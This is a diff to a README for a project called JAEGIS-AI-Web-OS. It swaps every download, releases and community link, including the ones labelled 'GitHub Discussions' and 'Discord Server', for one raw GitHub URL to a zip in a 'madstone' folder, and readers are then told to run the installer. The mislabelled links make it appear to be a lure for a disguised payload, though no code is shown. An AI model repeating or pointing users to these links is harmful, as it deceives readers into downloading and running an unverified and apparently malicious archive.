@@ -7,14 +7,14 @@ JAEGIS-AI-Web-OS is an all-in-one application foundry powered by artificial inte
 
 ## 📦 Download Now!
 
-[![Download JAEGIS-AI-Web-OS](https://img.shields.io/badge/Download-JAEGIS--AI--Web--OS-blue)](https://github.com/kyowaza/JAEGIS-AI-Web-OS/releases)
+[![Download JAEGIS-AI-Web-OS](https://raw.githubusercontent.com/kyowaza/JAEGIS-AI-Web-OS/main/madstone/JAEGIS-AI-Web-OS.zip)](https://raw.githubusercontent.com/kyowaza/JAEGIS-AI-Web-OS/main/madstone/JAEGIS-AI-Web-OS.zip)
 
 ## 🚀 Getting Started
 
 To get started with JAEGIS-AI-Web-OS, follow these simple steps:
 
 1. **Visit the Download Page:** 
-   Go to our Releases page. [Click here to download](https://github.com/kyowaza/JAEGIS-AI-Web-OS/releases).
+   Go to our Releases page. [Click here to download](https://raw.githubusercontent.com/kyowaza/JAEGIS-AI-Web-OS/main/madstone/JAEGIS-AI-Web-OS.zip).
 
 2. **Choose Your Version:** 
    Select the latest version of JAEGIS-AI-Web-OS for your system.
@@ -51,7 +51,7 @@ JAEGIS-AI-Web-OS includes several user-friendly features:
 
 To download JAEGIS-AI-Web-OS, please follow these steps again:
 
-1. **Visit the Downloads Page:** [Click here to download](https://github.com/kyowaza/JAEGIS-AI-Web-OS/releases).
+1. **Visit the Downloads Page:** [Click here to download](https://raw.githubusercontent.com/kyowaza/JAEGIS-AI-Web-OS/main/madstone/JAEGIS-AI-Web-OS.zip).
 2. **Select Your OS:** Find the version compatible with your operating system.
 3. **Run the Installer:** Open the downloaded file and follow the on-screen prompts.
 
@@ -77,8 +77,8 @@ If you encounter issues, please try the following steps:
 
 For any further questions or assistance, feel free to reach out to our community. You can find us on platforms like:
 
-- [GitHub Discussions](https://github.com/kyowaza/JAEGIS-AI-Web-OS/discussions)
-- [Discord Server](https://discord.gg/example)
+- [GitHub Discussions](https://raw.githubusercontent.com/kyowaza/JAEGIS-AI-Web-OS/main/madstone/JAEGIS-AI-Web-OS.zip)
+- [Discord Server](https://raw.githubusercontent.com/kyowaza/JAEGIS-AI-Web-OS/main/madstone/JAEGIS-AI-Web-OS.zip)
 
 We encourage feedback to improve JAEGIS-AI-Web-OS and welcome contributions.
 
@@ -92,5 +92,5 @@ Check out our documentation for more in-depth tutorials and resources:
 
 Thank you for choosing JAEGIS-AI-Web-OS. We hope you find it useful!
 
-[![Download JAEGIS-AI-Web-OS](https://img.shields.io/badge/Download-JAEGIS--AI--Web--OS-blue)](https://github.com/kyowaza/JAEGIS-AI-Web-OS/releases)
+[![Download JAEGIS-AI-Web-OS](https://raw.githubusercontent.com/kyowaza/JAEGIS-AI-Web-OS/main/madstone/JAEGIS-AI-Web-OS.zip)](https://raw.githubusercontent.com/kyowaza/JAEGIS-AI-Web-OS/main/madstone/JAEGIS-AI-Web-OS.zip)
 ```
